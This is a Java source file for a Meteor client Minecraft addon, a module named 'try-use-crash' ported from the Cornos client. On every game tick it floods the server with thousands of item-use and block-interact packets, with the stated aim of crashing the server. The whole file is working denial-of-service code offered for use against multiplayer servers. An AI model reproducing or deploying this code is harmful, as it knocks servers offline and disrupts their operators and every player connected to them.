/*
 *  Copyright (c) 2021 Wide_Cat and contributors.
 *
 * This source code is subject to the terms of the GNU General Public
 * License, version 3. If a copy of the GPL was not distributed with this
 * file, You can obtain one at: https://www.gnu.org/licenses/gpl-3.0.txt
 */

package widecat.meteorcrashaddon.modules;

/*
Ported from Cornos to Crash Addon by Wide_Cat
https://github.com/0x151/Cornos/blob/master/src/main/java/me/zeroX150/cornos/features/module/impl/exploit/crash/TryUseCrash.java
 */

import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerInteractItemC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;
import widecat.meteorcrashaddon.CrashAddon;

public class TryUseCrash extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Integer> packets = sgGeneral.add(new IntSetting.Builder()
        .name("packets")
        .description("How many packets to send per tick.")
        .defaultValue(1000)
        .min(400)
        .sliderMax(5000)
        .build()
    );

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable")
        .description("Disables module on kick.")
        .defaultValue(false)
        .build()
    );

    public TryUseCrash() {
        super(CrashAddon.CATEGORY, "try-use-crash", "Tries to crash the server by spamming use packets. (By 0x150)");
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        BlockHitResult bhr = new BlockHitResult(new Vec3d(.5, .5, .5), Direction.DOWN, mc.player.getBlockPos(), false);
        net.minecraft.network.packet.c2s.play.PlayerInteractItemC2SPacket packet = new PlayerInteractItemC2SPacket(Hand.MAIN_HAND, 0);
        PlayerInteractBlockC2SPacket packet1 = new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, bhr, 0);

        if (mc.getNetworkHandler() == null) return;

        for (int i = 0; i < packets.get(); i++) {
            mc.getNetworkHandler().sendPacket(packet);
            mc.getNetworkHandler().sendPacket(packet1);
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get()) toggle();
    }
}
